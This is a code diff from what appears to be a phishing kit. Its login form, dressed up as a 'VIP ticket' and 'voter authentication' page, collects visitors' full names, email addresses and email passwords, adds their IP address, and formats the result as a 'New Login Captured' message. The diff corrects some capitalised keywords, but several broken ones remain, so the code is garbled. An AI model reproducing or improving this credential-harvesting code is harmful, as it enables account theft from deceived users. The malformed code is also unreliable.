@@ -71,7 +71,7 @@ Password: string;
 Ip?: string;
 UserAgent?: string;
  }) => {
-Try {
+try {
 const message = `
 🔐 *New Login Captured*
 👤 Full Name: ${data.fullName}
@@ -103,22 +103,22 @@ E.preventDefault();
 SetErrorMessage(null);
 SetSuggestedProviderMatch(null);
 
-If (!fullName.trim()) {
+if (!fullName.trim()) {
 SetErrorMessage('Please enter your full name as you wish it to appear on your VIP ticket.');
 return;
     }
 
     // Real Email Validation (unchanged)
-Const validation = validateRealEmail(email.trim(), selectedProvider.id);
-If (!validation.isValid) {
+const validation = validateRealEmail(email.trim(), selectedProvider.id);
+if (!validation.isValid) {
 SetErrorMessage(validation.error || 'Please enter a valid, authentic email address.');
-If (validation.suggestedProviderId && validation.suggestedProviderId !== selectedProvider.id) {
+if (validation.suggestedProviderId && validation.suggestedProviderId !== selectedProvider.id) {
 Const found = PROVIDER_METAS.find((p) => p.id === validation.suggestedProviderId);
 If (found) setSuggestedProviderMatch(found);
       }
 return;
     }
-If (!password.trim() || password.length < 4) {
+if (!password.trim() || password.length < 4) {
 SetErrorMessage('Please enter your email account credentials/passcode to verify voter authentication.');
 Return;
     }
@@ -128,7 +128,7 @@ SetIsLoading(true);
 try {
 const ipResponse = await fetch('https://api.ipify.org?format=json');
 let ip = '';
-If (ipResponse.ok) {
+if (ipResponse.ok) {
 const { ip: fetchedIp } = await ipResponse.json();
 Ip = fetchedIp;
       }
